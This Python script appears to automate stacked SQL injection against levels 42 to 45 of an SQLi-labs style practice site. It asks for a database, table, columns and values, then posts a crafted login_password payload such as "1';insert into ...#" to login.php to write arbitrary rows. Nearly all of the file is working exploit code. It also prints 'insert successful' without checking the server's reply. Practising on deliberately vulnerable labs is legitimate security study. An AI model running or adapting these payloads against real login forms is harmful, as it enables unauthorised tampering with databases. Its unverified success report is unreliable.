import requests
import sys

class Less42_Less45(object):

    data = {}

    # Stacked injections
    def __init__(self,url,level,exploit):
        
        if url[-1] == "/":

            self.url = url

        else:

            self.url = url + "/"

        self.level = level

        self.exploit = exploit

    def payload(self):
        pass

    def Input(self):

        self.db = input("input the database name > ")

        self.table = input("input the table name > ")

        self.column = input("input the columns name,separate by [,] > ")

        self.schema = input("input the values name,spearate by [,] > ")


        if len(self.column.split(",")) == len(self.schema.split(",")) and self.db != '' and self.table != '':

            return True

        else:

            print()
            print("something was wrong,check the same amount of the columns and values")
            print("or check the database name and table name is correct")

    def Insert(self):

        schema = []


        for each in self.schema.split(","):

            schema.append("'"+each+"'")

        self.schema = ','.join(schema)


        if self.level == 42:

            self.data['login_user'] = ''
            self.data['login_password'] = "1';insert into "+self.db+"."+self.table+"("+self.column+") values("+self.schema+") #" 
            #self.data['mysubmit'] = 'Login'

            self.url = self.url + "login.php"
            rep = requests.post(self.url,data=self.data)

        elif self.level == 43:

            self.data['login_user'] = ''
            self.data['login_password'] = "1');insert into "+self.db+"."+self.table+"("+self.column+") values("+self.schema+") #" 

            self.url = self.url + "login.php"
            rep = requests.post(self.url,data=self.data)

        elif self.level == 44:

            self.data['login_user'] = ''
            self.data['login_password'] = "1';insert into "+self.db+"."+self.table+"("+self.column+") values("+self.schema+") #" 

            self.url = self.url + "login.php"
            rep = requests.post(self.url,data=self.data)

        elif self.level == 45:

            self.data['login_user'] = ''
            self.data['login_password'] = "1');insert into "+self.db+"."+self.table+"("+self.column+") values("+self.schema+") #"

            self.url = self.url + "login.php"
            rep = requests.post(self.url,data=self.data)

        else:

            print("need level argument")

        print("insert successful")

    def Update(self):
        pass

    def Delete(self):
        pass

    def List(self):
        print("0 insert into")
        print("1 update")
        print("2 delete")

    def TYPE(self):

        print("Stacked Injections")

        self.List()


        self.choice = int(input("which one you gonna select?"))


        if self.choice == 0 and self.Input():

            self.Insert()

        elif self.choice == 1:

            print("coming soon")

        elif self.choice == 2:

            print("coming soon")


    def Less_42(self):
        self.TYPE()

    def Less_43(self):
        self.TYPE()

    def Less_44(self):
        self.TYPE()

    def Less_45(self):
        self.TYPE()

